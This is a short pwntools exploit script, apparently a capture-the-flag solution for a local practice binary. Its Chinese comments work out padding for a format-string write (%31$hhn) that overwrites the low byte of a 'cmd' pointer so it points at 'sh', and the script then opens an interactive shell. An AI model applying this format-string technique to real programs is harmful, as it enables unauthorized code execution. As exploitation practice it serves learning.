# encoding: utf-8

from pwn import *

context.arch = 'amd64'

elf = ELF('./simple')

r = process('./simple')

cmd = elf.symbols['cmd']



# 因為 %s 解析後, 下個解析的位置在 fmt+2, 因此寫入 'a'*0x12 (b 到解析位置的 offset)
# 所以格式為 'a'*0x12+'b'*x + fmt + '\x00'(限制 %s 打印的字串)
# 目標是將 cmd 最後一位元改成 0x8d 也就是 sh 指到的位址

# 0x12 + x + 7 (len(%31$hhn)) + x = 0x8d
# 2x = 0x8d - 0x19 = 0x74
# x = 0x3a

payload = ('a'*0x12 + 'b'*0x3a + "%31$hhn"+'\x00').ljust(0xb0, 'a')+p64(cmd)
gdb.attach(r, 'fin\nn\nx/50gx b')
r.sendafter(':', payload)

r.interactive()